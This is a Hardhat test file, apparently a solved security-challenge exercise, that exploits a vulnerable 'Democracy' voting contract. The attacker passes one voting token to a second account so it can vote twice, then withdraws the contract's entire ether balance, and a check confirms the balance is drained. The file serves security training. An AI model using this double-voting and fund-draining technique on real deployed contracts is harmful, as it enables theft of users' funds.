const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet, spy] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract, attackerWallet, spy };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet, spy } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            // TODO: What if smart contracts were allowed?
            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
            await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, spy.address, 0);
            await victimContract.connect(spy).vote(attackerWallet.address);
            console.log("ok spy voted, transfer back");
            await victimContract.connect(spy).transferFrom(spy.address, attackerWallet.address, 0);
            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
